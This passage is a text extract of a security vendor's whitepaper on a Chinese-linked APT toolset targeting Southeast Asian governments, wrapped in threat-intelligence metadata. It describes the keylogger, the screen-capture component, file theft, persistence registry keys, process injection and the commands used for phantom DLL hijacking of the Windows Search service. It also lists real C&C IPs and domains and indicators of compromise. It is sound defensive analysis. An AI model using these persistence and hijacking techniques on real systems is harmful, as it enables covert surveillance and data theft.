e2d5565c2d5b5621b2272ea01e3a18d6) for this component has a specific pdb path set “E:\\Works\\self2\\screencap\\builder\\builder_mul\\Release\\Dll_deploy.pdb”.\n\nIts responsibility is to extract the template binary and to customize it by writing a config buffer next to the “prettygirl”\nstring. The config looks like:\n\nFig. 10 – ScreenCapconfig\n\nAfter the customization, the ScreenCap is dropped to “C:\\ProgramData\\winscr\\winscr.dll” and it is set to persist by\ncreating the “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\winscru” registry key and\nassigning it the rundll32”C:\\ProgramData\\winscr\\winscr.dll”,Start string value (it creates the “winscr” key value under\n**HKLMRun if the process has the corresponding privileges).**\n\nThe dropped ScreenCap uses the well-known chain of WINAPI function exported by Gdiplus.dll (GdiplusStartup,\n**CreateDCW, CreateDIBSection, BitBlt, GdipSaveImageToFile, etc.) for screen capturing. The obtained jpeg image**\nis temporarily saved as “ws.tmp” file in the same folder where the ScreenCap is dropped. Then, the ws.tmp file is\ntransformed into a binary blob (having the same format as that used by FilePak) and is appended to an archive file. It is\nimportant to note that the file name used in the corresponding blob is obtained in the following manner:\n\nFig. 11 – File name template corresponding to a screenshot\n\nThe archive name where all blobs with screenshots are stored is obtained in a similar way:\n\nFig. 12 – Archive name template\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe samples we found are using the following config: (5, 30, 8, “qwerasdf”, 21, “C:\\users\\public\\winsf”) which\nmeans that each archive will contain 30 blobs of images taken with a delay of 5 seconds. As key for obfuscation\nthe “qwerasdf” string will be used and all the archives will be written to “C:\\users\\public\\winsf” folder. An important\nobservation is that all of that happens in an infinite loop meaning that the computer screen will be monitored all the\ntime.\n\n### Keyrecord\n\nThe Keyrecord component is responsible for logging keystrokes on the victims’ system. It is dropped by a\ncorresponding DLL_Deploy dropper, an example of which is 8a278b97b8d33990d361149ee9921f9a.\n\nThe droppers we found have the template binary of the Keyrecod in a resource. The process of customization is similar\nto that of the ScreenCap and consists of obtaining the config buffer and writing it next to the “prettygirl” string. The\nconfig of Keyrecord has the folowing format:\n\nFig. 13 – Keyrecordconfig\n\nThe dropper is also responsible for creating the “%APPDATA%\\maxbear” folder where the Keyrecord is written\nunder a randomized name (the same format “%c%c%c%c%cutil.exe” used by FunnyDream droppers). Besides the\n**KeyrecordDLL file, the dropper creates a .lnk file that should load the DLL file using rundll32.exe. After the .lnk is**\ncreated, the dropper sets up the persistence by overwriting the default Startup folder with the %APPDATA%\\maxbear\n(the value of HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\startup is modified).\n\nThe keylogger runs an infinite loop, the block of which creates an archive file naming it like the ScreenCap does (using\nthe “%s\\\\fpak_%s_%d_%d_%d_%d.z” format string), starts logging the keystrokes to a “tk.tmp” file, and after obtaining a\nlong enough recording, it adds the log as a blob using the same format like Filepak to the archive. The file name field of\nblob corresponds to:\n\nFig. 14 - File name template corresponding to a keystroke log\n\nThe logging algorithm is illustrated in the following images:\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nFig. 15 - Keylogging mechanism\n\nFig. 16 – Keystroke capture\n\n### FilepakMonitor\n\nA much more interesting component of the toolset is FilePakMonitor. It embeds the FilePak capabilities but in a more\ncomplex way, being directly controlled by the attackers through a protocol over TCP.\n\nThis component is brought on the victim system by using a DLL_Deploy binary (e.g.\n**d3a6653b748eb5ff467149c9150762a1).**\n\nThe DLL_Deploydropper can be recognized by its specific pdb path - “E:\\Works\\MF\\hjbuilder2\\\n**Release\\wp_clt.pdb” and, also, by the “BIN” resource that contains the template of the payload. The**\ndropper obtains the resource buffer and adds the base64 representation of the C&C address next to\nthe “prettygirl” string. The d3a6653b748eb5ff467149c9150762a1 sample, for example, adds the\n“QqQq8aQm9WxjB4IjM32nMFsWOpnt9GTkBGT=” base64 string to the template, which is the representation of www.\n**_2008_** **_d t_** **_18198_**\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBefore dropping the FilePakMonitor, the dropper runs the “cmd /c net stop WSearch” command. Then the payload is\ndropped to the “C:\\Windows\\System32\\msfte.dll”and two other commands are executed - “cmd /c net start WSearch”\nand “cmd.exe /c scconfigwsearch start= auto”.\n\nThe goal of the executed commands in combination to the file path used by the dropper is to achieve stealth and\nprivilege escalation. By setting the WSearch service to start automatically, the attackers ensure persistence as well.\n\nThis mechanism is called “Phantom DLL Hijacking” because msfte.dll does not exist by default on Windows system,\nbut C:\\Windows\\system32\\SearchIndexer.exe (corresponding binary for WSearch service) tries to load that DLL each\ntime it starts. Moreover, the WSearch service runs with SYSTEM privileges, which means that the msfte.dll file will be\nexecuted as SYSTEM as well.\n\nSome of the paths where DLL_Deploy dropper was located are presented in the next table:\n\n\n**%USERS%\\public\\y54947.exe**\n\n**%USERS%\\Public\\M93732.exe**\n\n**%USERS%\\public\\x4984.exe**\n\n\nThe FilepakMonitor component has the “orign.dll” ExportName and the corresponding “E:\\Works\\MF\\oclt\\rlsdll\\orign.\n**pdb” pdb path. It exports two functions, called “Start” and “StartD”.**\n\nInterestingly, all the samples of FilePakMonitor try to inject themselves into the “Bka.exe” process. The injection\nhappens in the “Start” function. The DllMain function checks if the process that loaded the DLL has the “Bka” substring\nexiting if not.\n\nThe samples that are dropped under the “msfte.dll” name have a more complex logic. In the DllMain of such DLL, the\nprocess name is checked for “Bka” substring but also it is checked if the name differs from rundll32, in which case the\n**Start function is executed.**\n\nDuring the injection, a “Bka.exe” process is created, and using VirtualAllocEx, WriteProcessMemory and\n**CreateRemoteThread, the process is forced to load the DLL component.**\n\nThis component collects files with a specific extension from a hardcoded list similar with that presented in the FilePak\ncomponent (“doc;docx;ppt;pptx;xls;xlsx;txt;pdf;”).\n\nThe file listing action processes all logical drives and it is triggered every 12 hours. The first listing targets files that\nhave the extension included in the hardcoded list and the last change to the file was made no more than 20 days ago.\nAfter the first listing is completed, a SYSTEMTIME structure with current time is written to the “ft.data” file located in\nthe same folder as the module. That structure will be updated after each file listing and, starting with the second listing,\nthe FilePakMonitor will collect only files that were changed after the last listing (the ft.data SYSTEMTIME structure will\nbe used). This means that we are dealing with a component that monitors all files for changes and collects them for\nexfiltration. Moreover, all files that matches the criteria are added to a “fpak_<current tick count>.z” archive in the same\nfolder with the module having the same format like that used by FilePak.\n\nAnother interesting capability of the FilePakMonitor is the removable drive insertion detection and file collection from\nremovable devices. This is done by creating a window that intercept the WM_DEVICECHANGE events with parameters\n**DBT_DEVICEARRIVAL or DBT_DEVNODES_CHANGED. If such an event occurs, then all removable drives are listed and**\nall files are added to a new archive, which later is uploaded to C&C.\n\nThe folder with archives is listed every 60 seconds and if any file with a name having the “fpak” prefix and “.z” extension\nis detected, then a message to the C&C is sent and in a separated thread.The module receives commands to list the\nfolder with archived or to upload one or more archives.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### TcpBridge\n\nThis tool is used to obtain access to the internal network of the victim.\n\nWe found only one sample of this tool used in the investigated attack and this is\n**cd4ddac604e440197fb6838cc1fca313. Its pdb path is “C:\\works\\prjs\\tcp_bridge_proxy\\tbp_clt\\Release\\tbp_clt.pdb”.**\nThe location of the project is the same as the one used for Funnydream and Filepak, which suggests that it is custom\nmade.\n\nThe executable accepts 2 command line arguments, an IP address and a port, as the usage message states:\n\n“usage: tcp_bridge_clt.exe bridge_ipbridge_port”\n\nThe IP address to which the tool connects is assigned to the attacker’s server that sends to the tool commands to\nconnect to a given IP address and to push incoming traffic through that connection and to send back the outcoming\ndata.\n\nThe Tcp Bridge tool was located in a few locations as:\n\n\n**%COMMON_APPDATA%\\tbp_clt21.exe**\n\n**%USERS%\\public\\downloads\\tbp_clt21.exe**\n\n**%USERS%\\public\\libraries\\googleupdat.exe**\n\n\n**%USERS%\\public\\libraries\\asf32.exe**\nAnalyzing the command line data feed, we identified 3 different command line arguments given to the executable:\n\n- 58.64.184.203 443\n\n- 58.64.209.83 443\n\n- 58.64.209.83 8888\n\n### Tcp_transfer\n\nAnother tool related to the FunnyDream toolset is the so called TcpTransfer. The specific details of this tool are its\n“tcp_transfer.exe” Export Name and the “C:\\works\\self\\tcp_transfer\\Release\\tcp_transfer.pdb” pdb path.\n\nWe were able to find only 2 samples of the tool used in this attack:\n\n 88e486dc8f876359617870c999d9b1d2 (C&C address - 154.216.2[.]135)\n 470bcfdf9e7aad3831d84a04d75337ab (C&C address - 58.64.184[.]201)\n\nThe executable binds to “0.0.0.0:8080’ address and starts listening for local connection. For each incoming connection\non the local address, it creates a new connection to the C&C and start receiving and sending the data.\n\nThe goal of such tool is to bypass network restriction such that the compromised machines that are not connected\ndirectly to the internet can communicate with the C&C through another compromised machine that has an internet\nconnection.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### Md_client\n\nThe Md_client module is another custom made backdoor like component with the “C:\\works\\prjs\\MD\\md_client\\\n**rlsexe\\md_client.pdb” pdb path and the “prettygirl” string that matches the known pattern of the toolset. Also, there**\nare some RTTI artefacts present in binaries that can be found in the FilePakMonitor binaries (e.g. FileTransmitBase,\n**FileTransmitDownload and FileTransmitUpload class names).**\n\nFurthermore, the samples we found connect to subdomains of wmiprvse[.]com.\n\nThis component uses the UDP and the 53 port to communicate with the C&C server and is capable of:\n\n Collecting system information like computer name, user name, osverion, processor architecture;\n Creating a remote shell by running a cmd.exe with stdin/stdout/stderr “connected” to the C&C\n Sending the Logical Drive Strings\n Listing a directory\n Uploading and downloading a file\n Deleting a directory\n Executing a command using ShellExecuteW\n Executing a command using CreateDesktop (“mydktop1”) and CreateProcess\n\n## C&C infrastructure\n\nThe domains or IP addresses of command and control servers are hardcoded in binary files. For each component, the\ntable below illustrates the C&Cs found in samples.\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nTcp transfer 154.216.2[.]135\n\n58.64.184[.]201\n\nMd_client cloud.wmiprvse[.]com\n\nwww.wmiprvse[.]com\n\nupdate.wmiprvse[.]com\n\nMost of the infrastructure is located in Hong Kong, except for three servers: one in Vietnam, one in China and one in\nSouth Korea.\n\nFig. 17 – C&C geolocation\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nFig. 18 – Domain Activity Timeline\n\nAll of these domains used by attackers were registered using the same email address “newday20180314@outlook.\n**com”. However, the list of domains registered using this address is more extensive:**\n\n **leapconfig[.]com**\n **updateui[.]com**\n **realteke[.]com**\n **ksdeui[.]com**\n **msseces[.]com**\n **osppsvc[.]com**\n **nissrv[.]com**\n **unikeyupdating[.]com**\n **unikeyupdate[.]com**\n **mdnsresponder[.]com**\n **winserverupdate[.]com**\n **wmiprvse[.]com**\n **igfxpers[.]com**\n **bitupdating[.]com**\n **eofficeupdate[.]com**\n **mfaupdating[.]com**\n **mfaupdate[.]com**\n **bkavutil[.]com**\n **eofficeupdating[.]com**\n **igfxsrvc[.]com**\n **ws2008update[.]com**\n **ksdeupdate[.]com**\n **iatupdate[.]com**\n **iumsvc[.]com**\n\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n## Attribution\n\nAttributing APT style attacks to a particular group or country can be extremely difficult, mostly because forensic\nartefacts can sometimes be planted intentionally, C&C infrastructure can reside anywhere in the world, and the tools\nused can be repurposed from other APT groups.\n\nWhile having a C&C infrastructure based in the same region as the victims isn’t usually considered a sign that attackers\nshare the same geographical region, the internet infrastructure within that particular region is highly restrictive.\nIt’s likely that relying on a locally deployed C&C infrastructure would bring several advantages to the APT group.\nFor instance, it could be easier to manage and control, while at the same time the C&C IPs wouldn’t be flagged as\nsuspicious, as they would be part of the same regional internet infrastructure. Opting for a command and control\ninfrastructure deployed anywhere else in the world would have potentially raised some security alarms.\n\nDuring this analysis, some forensic artefacts seem to suggest a Chinese-speaking APT group, as some of the\nresources found in several binaries had a language set to Chinese, and the Chinoxy backdoor used during the\ncampaign is a Trojan known to have been used by Chinese-speaking threat actors.\n\nWhile we’re constantly monitoring for APT-like activity around the world, not all APT-style attacks can be attributed to a\nknown APT group, mostly because some of the used the tools are sometimes share between multiple groups.\n\n## IOCs\n\nAn up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat\n[Intelligence users. More information about the program is available at https://www.bitdefender.com/oem/advanced-](https://www.bitdefender.com/oem/advanced-threatintelligence.html)\n[threatintelligence.html](https://www.bitdefender.com/oem/advanced-threatintelligence.html)\n\n### Hashes\n\n**Component** **Sha256**\n```\nccf32/ccf64 1cd8b6f1e2d49e6605f5ae695ea126eee8c82264a9644758126a4c30662ce9d5\n               91dfbee660be3d11f8a631b4bbf552d0ee60ec908f4d0817643d591726d53bfd\nChinoxy dropper 69c1f791402e36a360a901e3e42c177b02281a84c275a228b00b86596636fa95\n               8ff4979b40ffcef7eedcfeb6fb4fecb42aceb53bc816dc4d36428e12ad67d051\n               e5365d81ee31e9b86ea14e1ee7abf0809337f3bc9e7b00d7492c2caed4ca5f36\n               c01110788b9345b5564c1b5b0876a27e1b2501b19b90280054026e89f68a4f48\nChinoxy Backdoor 2d20fc0fd6ef07c367761abe97762f044e90e428addd9a9af7b6cf88087d455b\n               6f7f142089b1d2e48880f59362c7c50e5d193166bdd5e4b27318133e8fe27b2c\nPcShare dropper f3b16798054a4510650682e17ae5bc12d27b460eac8314318eeda5e0488869dc\n               9670563876caa2587d4001d3cbda11a4ca4601fd9f0555ec9468f4796fce7ae6\n               26afbe3cab4967cb48ada596959ef77367da9cb194c71db77ebe1fcbe7aabf6f\n               0a2a047c2b670f7da11a7d72e2ab3b867eebb6ccbe3ccad92817a6e74ac343a2\n               70891a33bcd94e40cdbb0660b983dd7dc439005b2cae614c7b7504fd24eb8696\n               942e810563d142c949215dbe38562f1ffb31d4b9afc8a98047d97ed2e7ece478\n\n```\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n```\nPcShare loader f976a52f2d82e608f95e95d41e2eacad58e19a9e9cb92f061090d72fd2703413\n               f262662bd9c78137837e5943f891da3b520095668c0592bc11c0dc742db0640a\n               9a3829bd0a4dd7b72c54d1aed972f91aede57357d7a9dcd3d9f8b8d192189a03\n               e61649ac70198e223c123ad29c7d02ebe4fe6da7f35282d26bd93d466e85176d\n               f6f9d0620db35c1f6a3fad9c9bc6d7aaf6594355b606bce2b9513aa721679d95\n               139d4c31f1dfd17b74506931622d12c537d597c85e52a58065cf3a917b469aea\n               a224ab4d8ca5ed62755b1b7f36ce6c80e89a684d1e792400d8fa889b1860fcc6\n               311f3011172618c95fcf339ac3ddce10c415c95215eb6cea60d5eb9b00a5de51\n               0f5cac319750d37eb6a7d38c1deec7d5839c642287b48b0fb8a1921185b521f1\n               f76847bed642a92d3a5fac4782d0ae2a140203579f43f7b3c8db4090853986ad\n               7b524c3bdd5d5474b6e050084e3f32d2bf7f5c4539b44221e4bc2987b2deb56d\n               8d3b5825690d4f893cc577b22cbe3c12232b9895c9a0417b750ba722e8851d6d\n               4caab78b44c288406b3d66feab853a399c72b237e244993434dd6206013cc371\n               8c49d7f83af949f4145d5da32c308ef98ebfc5fce030a405bf2b6855a8a0575e\nPcMain 85bd4f36c20222d1e0a1908bb2befd9a19d9e476ef8fdffa8c7b2f14ec22ce01\n               7ecba3270ff06c5d618a78c4e471f457e8672211bb8cdd4aa58b6516ea5fe603\n               f7356689c3c4caca57d7edd4a45ac3a2cfa672ccf444e80a69fd271210d320f3\nMD_Client 631c62e067667a02da63a97aeeb556bece8394deee59e62b48f63baecf4cf613\n               2e6dfca6b2b8a11d6eb8933bd7ed7f17ca46499a3ee548bbb086406eb57b2204\n               28570122e952f25c92dfb83707c502a5036b9f99770127435cbb8c7e6796cce4\nFilePakMonitor 25ce8296bc4da119093d847afc18ee030a4c94a39066732227a73f8908c40292\n               a276a0e01b5024f46ef1a05a5e9810c39b8757a0cea665519bf619bf35604008\n               a78dace0fd8c043016406f99f0103cd7ebee67e21261c0097efe6072bfc680b0\n               58f88767a4599a95f29048852f92afe52a32b646ffdd50291cd1be5a97ebe7ea\n               2fdc7963612be26b8c13ed59572bd2785c1d11da15494c34a0f1632530fddf64\n               409e95e0824c4e80450196dbde2e64a2424d3e724760e471c1e68d3fb67dec24\nFunnyDreamTcpBridge 915af21d627f5bec059800bb9740a228e93fae8dd4fd574bd4d2812c7d6adf8d\nFunnyDreamTcpTransfer 32cabf2952f88283251c36751e04a45bfa78cdb0835460619d4812b882795c03\n               63e8488de30c9b615c76d4e568f0a1b738fcad665e58571c299d8e9d7752a637\nFunnyDreamKeylogger aaf9ce055918b0092bba7db26816237170870601614155defe143986b5dac8fe\n               05f9a809a6800112fa1e02975489974d003d55810a4cfb11a0705e8a427ea734\nFunnyDreamScreenCap 2bf0b8453c5f5a3f616894d72acb61868bb6c75403891411a123eceb6d0f9f9b\n               46e1381c0228502276f1eb3b755f9f34f6a6d4ffbbecc95bde852ddf40e09ad8\n               74b8030c67320030998e8f58da4a6215dd4cc4c0aef7863c5fc8a1985cbf22a4\nFunnyDreamFilePak 9a63d810f69eb35ee8ee3797bd1574e08b67f31c0e368bf9cf01202f5f73c664\n               1aa170383d473b6adb16032942b34eb136dd013ea8e2f5cc8fec7356a92191b3\nFunnyDreamBackdoor 7d92c7bc22dc95526a0c8713211b9bcfe85cac2c4a760067e69992afa19efbe5\n               455d890479f1137797bfb32e6f5f1a4634a69c11654bb5ec0b6710a25418a12e\n               ba3d8ff9b3f6b6223dd33dee15321e267cc28627723e68cd632e59d85c529330\n               780739a25d90fd850e82792d59de4c04530337e79cd4b7a3149f229b75a7d5ce\n               682df3d96cf40a24637905d9ab7a62e3dd0777a1320b078bc89951076f842744\n               47519ef2e613fd17b18e885bb09cfa1e047feaa86d6d16d3916d14c3b244c533\n               5e90afbdfb63110fa3c9cdd79ef474852996a895a6bad66a663e2ccc51dd339b\nDll_Deploy 145ec6dac68fe28857220db70575c5f97540c901509e1b009ecb7857047d0bfd\n               5648ba8ba4d1dd623f82fb9adebcf87085a8a619147e7979ea08f763ab69b0cb\n               c41fa483bd7e186d754d592405d4649adcb78192b3a66586e526ecb6be0f17b5\n               aefe49a247322d3bbefc9e29d30c809499518b947a88d0c2ac9e11cf735b1544\n               80a1fd088d0153a0c33fd606660f9d8e82349cdb6fade850cc06e07fe6732d4b\n               e97ac9089fa80dc38e8fe920008c117d93203e45a1516d24b59f17f7055b8ced\n\n```\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n### Mutexes\n```\n_mhello_scrream\n_mhello_hidream\n_mhello_xhdream\n_mhello_krcream\n\n Events\n_zent0\n_endznt0\n_zkent0\n\n Paths\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\U8VCQutil.exe \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\BDPTSutil.exe\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\H7kSFutil.exe \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\I7YaOutil.exe \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Y7KFPutil.exe \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Q7RK1util.exe\n%PUBLIC%\\libraries\\winmsg.dll\n%COMMON_APPDATA%\\microsoft\\netframework\\winmsg.dll\n%PUBLIC%\\bin\\winmsg.dll\n%PUBLIC%\\libraries\\winuser.dll\n%COMMON_APPDATA%\\wmiutil.dll\n%PUBLIC%\\libraries\\wmihelp.dll\nC:\\Users\\<user>\\appdata\\local\\temp\\unikeytn.exe\n%COMMON_APPDATA%\\microsoft\\netframework\\vssvb.exe\n%COMMON_APPDATA%\\conhosts.exe\n%PUBLIC%\\libraries\\conhosts.exe\nC:\\ProgramData\\winscr\\winscr.dll\nC:\\users\\public\\winsf\n%APPDATA%\\maxbear\n%COMMON_APPDATA%\\tbp_clt21.exe\n%USERS%\\public\\downloads\\tbp_clt21.exe\n%USERS%\\public\\libraries\\googleupdat.exe\n%USERS%\\public\\libraries\\asf32.exe\n\n```\n%COMMON_STARTUP%\\\\eoffice.exe\n```\n%LOCALAPPDATA%\\microsoft\\windows\\explorer\\update\\wuauong.tlb\nC:\\Users\\Public\\ccf32.exe\n\n```\nc:\\users\\public\\bin\\filepak.exe\n```\n%USERS%\\public\\y54947.exe\n%USERS%\\Public\\M93732.exe\n%USERS%\\ bli \\ 4984\n\n```\n\n-----\n\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\n\n### File Mappings\n```\n7f8b6a244035c9e5b\n55fc3f9a654c50093\n\n```\n\n-----\n\n**UNDISPUTED INNOVATION LEADER.** **WORLD’S FIRST END-TO-END BREACH AVOIDANCE**\n38% of all cybersecurity vendors worldwide integrated The first security solution to unify hardening, prevention,\nat least one Bitdefender technology. Present in 150 detection and response across endpoint, network and\ncountries. cloud.\n\n**#1 RANKED SECURITY. AWARDED ACROSS THE BOARD.**\n\n##### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.11.16.Chinese_APT_South_Eastern_Asian/Bitdefender-Whitepaper-Chinese-APT.pdf",
        "https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
    ],
    "report_names": [
        "Bitdefender-Whitepaper-Chinese-APT",
        "Bitdefender-Whitepaper-Chinese-APT.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b98eb1ec-dc8b-4aea-b112-9e485408dd14",
            "created_at": "2022-10-25T16:07:23.649308Z",
            "updated_at": "2025-03-27T02:02:09.906895Z",
            "deleted_at": null,
            "main_name": "FunnyDream",
            "aliases": [
                "Bronze Edgewood",
                "Red Hariasa",
                "TAG-16"
            ],
            "source_name": "ETDA:FunnyDream",
            "tools": [
                "Chinoxy",
                "Filepak",
                "FilepakMonitor",
                "FunnyDream",
                "Keyrecord",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Md_client",
                "PCShare",
                "ScreenCap",
                "TcpBridge",
                "Tcp_transfer",
                "ccf32"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1605561617,
    "ts_modification_date": 1605561621,
    "files": {
        "pdf": "https://archive.orkl.eu/04f2e7dae2a99039549957795de625810f0e2698.pdf",
        "text": "https://archive.orkl.eu/04f2e7dae2a99039549957795de625810f0e2698.txt",
        "img": "https://archive.orkl.eu/04f2e7dae2a99039549957795de625810f0e2698.jpg"
    }
}